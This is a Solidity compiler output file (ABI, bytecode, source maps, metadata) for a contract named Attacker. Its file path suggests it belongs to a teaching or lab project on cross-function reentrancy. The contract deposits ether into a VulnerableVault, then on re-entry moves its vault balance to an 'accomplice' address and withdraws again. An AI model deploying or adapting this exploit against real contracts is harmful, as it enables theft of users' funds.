{"abi":[{"type":"constructor","inputs":[{"name":"_vault","type":"address","internalType":"address"},{"name":"_accomplice","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"accomplice","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"attack","inputs":[],"outputs":[],"stateMutability":"payable"},{"type":"function","name":"attackStep","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"getBalance","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"vault","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract VulnerableVault"}],"stateMutability":"view"}],"bytecode":{"object":"0x608060405234801561000f575f5ffd5b5060405161090e38038061090e83398181016040528101906100319190610115565b815f5f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508060015f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505050610153565b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100e4826100bb565b9050919050565b6100f4816100da565b81146100fe575f5ffd5b50565b5f8151905061010f816100eb565b92915050565b5f5f6040838503121561012b5761012a6100b7565b5b5f61013885828601610101565b925050602061014985828601610101565b9150509250929050565b6107ae806101605f395ff3fe60806040526004361061004d575f3560e01c806312065fe0146102d95780637a164584146103035780639e5faafc1461032d578063d12fd49a14610337578063fbfa77cf14610361576102d5565b366102d5575f6002541480156100f957505f5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166327e235e3306040518263ffffffff1660e01b81526004016100b89190610565565b602060405180830381865afa1580156100d3573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906100f791906105b5565b115b156102d35760016002819055505f60025f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166327e235e3306040518263ffffffff1660e01b81526004016101629190610565565b602060405180830381865afa15801561017d573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906101a191906105b5565b6101ab919061060d565b90505f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff16836040518363ffffffff1660e01b815260040161022992919061064c565b5f604051808303815f87803b158015610240575f5ffd5b505af1158015610252573d5f5f3e3d5ffd5b505050505f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b81526004015f604051808303815f87803b1580156102bb575f5ffd5b505af11580156102cd573d5f5f3e3d5ffd5b50505050505b005b5f5ffd5b3480156102e4575f5ffd5b506102ed61038b565b6040516102fa9190610673565b60405180910390f35b34801561030e575f5ffd5b50610317610392565b6040516103249190610673565b60405180910390f35b610335610398565b005b348015610342575f5ffd5b5061034b6104dd565b6040516103589190610565565b60405180910390f35b34801561036c575f5ffd5b50610375610502565b60405161038291906106e7565b60405180910390f35b5f47905090565b60025481565b671bc16d674ec800003410156103e3576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016103da9061075a565b60405180910390fd5b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0346040518263ffffffff1660e01b81526004015f604051808303818588803b158015610449575f5ffd5b505af115801561045b573d5f5f3e3d5ffd5b50505050505f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b81526004015f604051808303815f87803b1580156104c5575f5ffd5b505af11580156104d7573d5f5f3e3d5ffd5b50505050565b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f61054f82610526565b9050919050565b61055f81610545565b82525050565b5f6020820190506105785f830184610556565b92915050565b5f5ffd5b5f819050919050565b61059481610582565b811461059e575f5ffd5b50565b5f815190506105af8161058b565b92915050565b5f602082840312156105ca576105c961057e565b5b5f6105d7848285016105a1565b91505092915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601260045260245ffd5b5f61061782610582565b915061062283610582565b925082610632576106316105e0565b5b828204905092915050565b61064681610582565b82525050565b5f60408201905061065f5f830185610556565b61066c602083018461063d565b9392505050565b5f6020820190506106865f83018461063d565b92915050565b5f819050919050565b5f6106af6106aa6106a584610526565b61068c565b610526565b9050919050565b5f6106c082610695565b9050919050565b5f6106d1826106b6565b9050919050565b6106e1816106c7565b82525050565b5f6020820190506106fa5f8301846106d8565b92915050565b5f82825260208201905092915050565b7f4e656564206174206c65617374203220657468657200000000000000000000005f82015250565b5f610744601583610700565b915061074f82610710565b602082019050919050565b5f6020820190508181035f83015261077181610738565b905091905056fea2646970667358221220e2abf97e9a1d87f841f448a471b0b6f795ec89c8cd19fd4eb61f1be7c0c64d9a64736f6c63430008210033","sourceMap":"90:1024:19:-:0;;;211:131;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;294:6;270:5;;:31;;;;;;;;;;;;;;;;;;324:11;311:10;;:24;;;;;;;;;;;;;;;;;;211:131;;90:1024;;88:117:22;197:1;194;187:12;334:126;371:7;411:42;404:5;400:54;389:65;;334:126;;;:::o;466:96::-;503:7;532:24;550:5;532:24;:::i;:::-;521:35;;466:96;;;:::o;568:122::-;641:24;659:5;641:24;:::i;:::-;634:5;631:35;621:63;;680:1;677;670:12;621:63;568:122;:::o;696:143::-;753:5;784:6;778:13;769:22;;800:33;827:5;800:33;:::i;:::-;696:143;;;;:::o;845:507::-;924:6;932;981:2;969:9;960:7;956:23;952:32;949:119;;;987:79;;:::i;:::-;949:119;1107:1;1132:64;1188:7;1179:6;1168:9;1164:22;1132:64;:::i;:::-;1122:74;;1078:128;1245:2;1271:64;1327:7;1318:6;1307:9;1303:22;1271:64;:::i;:::-;1261:74;;1216:129;845:507;;;;;:::o;90:1024:19:-;;;;;;;","linkReferences":{}},"deployedBytecode":{"object":"0x60806040526004361061004d575f3560e01c806312065fe0146102d95780637a164584146103035780639e5faafc1461032d578063d12fd49a14610337578063fbfa77cf14610361576102d5565b366102d5575f6002541480156100f957505f5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166327e235e3306040518263ffffffff1660e01b81526004016100b89190610565565b602060405180830381865afa1580156100d3573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906100f791906105b5565b115b156102d35760016002819055505f60025f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166327e235e3306040518263ffffffff1660e01b81526004016101629190610565565b602060405180830381865afa15801561017d573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906101a191906105b5565b6101ab919061060d565b90505f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff16836040518363ffffffff1660e01b815260040161022992919061064c565b5f604051808303815f87803b158015610240575f5ffd5b505af1158015610252573d5f5f3e3d5ffd5b505050505f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b81526004015f604051808303815f87803b1580156102bb575f5ffd5b505af11580156102cd573d5f5f3e3d5ffd5b50505050505b005b5f5ffd5b3480156102e4575f5ffd5b506102ed61038b565b6040516102fa9190610673565b60405180910390f35b34801561030e575f5ffd5b50610317610392565b6040516103249190610673565b60405180910390f35b610335610398565b005b348015610342575f5ffd5b5061034b6104dd565b6040516103589190610565565b60405180910390f35b34801561036c575f5ffd5b50610375610502565b60405161038291906106e7565b60405180910390f35b5f47905090565b60025481565b671bc16d674ec800003410156103e3576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016103da9061075a565b60405180910390fd5b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0346040518263ffffffff1660e01b81526004015f604051808303818588803b158015610449575f5ffd5b505af115801561045b573d5f5f3e3d5ffd5b50505050505f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b81526004015f604051808303815f87803b1580156104c5575f5ffd5b505af11580156104d7573d5f5f3e3d5ffd5b50505050565b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f61054f82610526565b9050919050565b61055f81610545565b82525050565b5f6020820190506105785f830184610556565b92915050565b5f5ffd5b5f819050919050565b61059481610582565b811461059e575f5ffd5b50565b5f815190506105af8161058b565b92915050565b5f602082840312156105ca576105c961057e565b5b5f6105d7848285016105a1565b91505092915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601260045260245ffd5b5f61061782610582565b915061062283610582565b925082610632576106316105e0565b5b828204905092915050565b61064681610582565b82525050565b5f60408201905061065f5f830185610556565b61066c602083018461063d565b9392505050565b5f6020820190506106865f83018461063d565b92915050565b5f819050919050565b5f6106af6106aa6106a584610526565b61068c565b610526565b9050919050565b5f6106c082610695565b9050919050565b5f6106d1826106b6565b9050919050565b6106e1816106c7565b82525050565b5f6020820190506106fa5f8301846106d8565b92915050565b5f82825260208201905092915050565b7f4e656564206174206c65617374203220657468657200000000000000000000005f82015250565b5f610744601583610700565b915061074f82610710565b602082019050919050565b5f6020820190508181035f83015261077181610738565b905091905056fea2646970667358221220e2abf97e9a1d87f841f448a471b0b6f795ec89c8cd19fd4eb61f1be7c0c64d9a64736f6c63430008210033","sourceMap":"90:1024:19:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;584:1;570:10;;:15;:52;;;;;621:1;589:5;;;;;;;;;;;:14;;;612:4;589:29;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;:33;570:52;566:435;;;651:1;638:10;:14;;;;746:22;803:1;771:5;;;;;;;;;;;:14;;;794:4;771:29;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;:33;;;;:::i;:::-;746:58;;818:5;;;;;;;;;;;:14;;;833:10;;;;;;;;;;;845:14;818:42;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;974:5;;;;;;;;;;;:14;;;:16;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;624:377;566:435;90:1024;;;;;1013:99;;;;;;;;;;;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;179:25;;;;;;;;;;;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;348:175;;;:::i;:::-;;148:25;;;;;;;;;;;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;114:28;;;;;;;;;;;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;1013:99;1058:7;1084:21;1077:28;;1013:99;:::o;179:25::-;;;;:::o;348:175::-;414:7;401:9;:20;;393:54;;;;;;;;;;;;:::i;:::-;;;;;;;;;457:5;;;;;;;;;;;:13;;;478:9;457:33;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;500:5;;;;;;;;;;;:14;;;:16;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;348:175::o;148:25::-;;;;;;;;;;;;;:::o;114:28::-;;;;;;;;;;;;;:::o;7:126:22:-;44:7;84:42;77:5;73:54;62:65;;7:126;;;:::o;139:96::-;176:7;205:24;223:5;205:24;:::i;:::-;194:35;;139:96;;;:::o;241:118::-;328:24;346:5;328:24;:::i;:::-;323:3;316:37;241:118;;:::o;365:222::-;458:4;496:2;485:9;481:18;473:26;;509:71;577:1;566:9;562:17;553:6;509:71;:::i;:::-;365:222;;;;:::o;674:117::-;783:1;780;773:12;920:77;957:7;986:5;975:16;;920:77;;;:::o;1003:122::-;1076:24;1094:5;1076:24;:::i;:::-;1069:5;1066:35;1056:63;;1115:1;1112;1105:12;1056:63;1003:122;:::o;1131:143::-;1188:5;1219:6;1213:13;1204:22;;1235:33;1262:5;1235:33;:::i;:::-;1131:143;;;;:::o;1280:351::-;1350:6;1399:2;1387:9;1378:7;1374:23;1370:32;1367:119;;;1405:79;;:::i;:::-;1367:119;1525:1;1550:64;1606:7;1597:6;1586:9;1582:22;1550:64;:::i;:::-;1540:74;;1496:128;1280:351;;;;:::o;1637:180::-;1685:77;1682:1;1675:88;1782:4;1779:1;1772:15;1806:4;1803:1;1796:15;2009:185;2049:1;2066:20;2084:1;2066:20;:::i;:::-;2061:25;;2100:20;2118:1;2100:20;:::i;:::-;2095:25;;2139:1;2129:35;;2144:18;;:::i;:::-;2129:35;2186:1;2183;2179:9;2174:14;;2009:185;;;;:::o;2200:118::-;2287:24;2305:5;2287:24;:::i;:::-;2282:3;2275:37;2200:118;;:::o;2324:332::-;2445:4;2483:2;2472:9;2468:18;2460:26;;2496:71;2564:1;2553:9;2549:17;2540:6;2496:71;:::i;:::-;2577:72;2645:2;2634:9;2630:18;2621:6;2577:72;:::i;:::-;2324:332;;;;;:::o;2662:222::-;2755:4;2793:2;2782:9;2778:18;2770:26;;2806:71;2874:1;2863:9;2859:17;2850:6;2806:71;:::i;:::-;2662:222;;;;:::o;2890:60::-;2918:3;2939:5;2932:12;;2890:60;;;:::o;2956:142::-;3006:9;3039:53;3057:34;3066:24;3084:5;3066:24;:::i;:::-;3057:34;:::i;:::-;3039:53;:::i;:::-;3026:66;;2956:142;;;:::o;3104:126::-;3154:9;3187:37;3218:5;3187:37;:::i;:::-;3174:50;;3104:126;;;:::o;3236:151::-;3311:9;3344:37;3375:5;3344:37;:::i;:::-;3331:50;;3236:151;;;:::o;3393:181::-;3505:62;3561:5;3505:62;:::i;:::-;3500:3;3493:75;3393:181;;:::o;3580:272::-;3698:4;3736:2;3725:9;3721:18;3713:26;;3749:96;3842:1;3831:9;3827:17;3818:6;3749:96;:::i;:::-;3580:272;;;;:::o;3858:169::-;3942:11;3976:6;3971:3;3964:19;4016:4;4011:3;4007:14;3992:29;;3858:169;;;;:::o;4033:171::-;4173:23;4169:1;4161:6;4157:14;4150:47;4033:171;:::o;4210:366::-;4352:3;4373:67;4437:2;4432:3;4373:67;:::i;:::-;4366:74;;4449:93;4538:3;4449:93;:::i;:::-;4567:2;4562:3;4558:12;4551:19;;4210:366;;;:::o;4582:419::-;4748:4;4786:2;4775:9;4771:18;4763:26;;4835:9;4829:4;4825:20;4821:1;4810:9;4806:17;4799:47;4863:131;4989:4;4863:131;:::i;:::-;4855:139;;4582:419;;;:::o","linkReferences":{}},"methodIdentifiers":{"accomplice()":"d12fd49a","attack()":"9e5faafc","attackStep()":"7a164584","getBalance()":"12065fe0","vault()":"fbfa77cf"},"rawMetadata":"{\"compiler\":{\"version\":\"0.8.33+commit.64118f21\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_vault\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_accomplice\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"accomplice\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"attack\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"attackStep\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getBalance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"vault\",\"outputs\":[{\"internalType\":\"contract VulnerableVault\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"src/02-cross-function-reentrancy/Attacker.sol\":\"Attacker\"},\"evmVersion\":\"prague\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[\":forge-std/=lib/forge-std/src/\"]},\"sources\":{\"src/02-cross-function-reentrancy/Attacker.sol\":{\"keccak256\":\"0x36828b80ad65087bde4d96db5c501321f025d34f0ffebea38ea0de8298ac794e\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://264a89dccd4d947c782d8ac6fceeee7d7a04e1450dcb07a604afb1b273180ceb\",\"dweb:/ipfs/QmdX3UaLbep7a7pwvXtocjXKVpfmD2ue59xKzjLdw3a5JD\"]},\"src/02-cross-function-reentrancy/VulnerableVault.sol\":{\"keccak256\":\"0x41eeb40f976d8d37d60ae947ddbf9e4ef28736803a6a155ba7568a17642b78df\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://00fbc44fd883c27467aa26d69a81e608636b377d0e2ef69384485499b56cadf6\",\"dweb:/ipfs/QmQW5MkWTkQ29YCEromebU5ifpXxxZktYjyHrDTViXCHkE\"]}},\"version\":1}","metadata":{"compiler":{"version":"0.8.33+commit.64118f21"},"language":"Solidity","output":{"abi":[{"inputs":[{"internalType":"address","name":"_vault","type":"address"},{"internalType":"address","name":"_accomplice","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"stateMutability":"view","type":"function","name":"accomplice","outputs":[{"internalType":"address","name":"","type":"address"}]},{"inputs":[],"stateMutability":"payable","type":"function","name":"attack"},{"inputs":[],"stateMutability":"view","type":"function","name":"attackStep","outputs":[{"internalType":"uint256","name":"","type":"uint256"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"getBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"vault","outputs":[{"internalType":"contract VulnerableVault","name":"","type":"address"}]},{"inputs":[],"stateMutability":"payable","type":"receive"}],"devdoc":{"kind":"dev","methods":{},"version":1},"userdoc":{"kind":"user","methods":{},"version":1}},"settings":{"remappings":["forge-std/=lib/forge-std/src/"],"optimizer":{"enabled":false,"runs":200},"metadata":{"bytecodeHash":"ipfs"},"compilationTarget":{"src/02-cross-function-reentrancy/Attacker.sol":"Attacker"},"evmVersion":"prague","libraries":{}},"sources":{"src/02-cross-function-reentrancy/Attacker.sol":{"keccak256":"0x36828b80ad65087bde4d96db5c501321f025d34f0ffebea38ea0de8298ac794e","urls":["bzz-raw://264a89dccd4d947c782d8ac6fceeee7d7a04e1450dcb07a604afb1b273180ceb","dweb:/ipfs/QmdX3UaLbep7a7pwvXtocjXKVpfmD2ue59xKzjLdw3a5JD"],"license":"MIT"},"src/02-cross-function-reentrancy/VulnerableVault.sol":{"keccak256":"0x41eeb40f976d8d37d60ae947ddbf9e4ef28736803a6a155ba7568a17642b78df","urls":["bzz-raw://00fbc44fd883c27467aa26d69a81e608636b377d0e2ef69384485499b56cadf6","dweb:/ipfs/QmQW5MkWTkQ29YCEromebU5ifpXxxZktYjyHrDTViXCHkE"],"license":"MIT"}},"version":1},"id":19}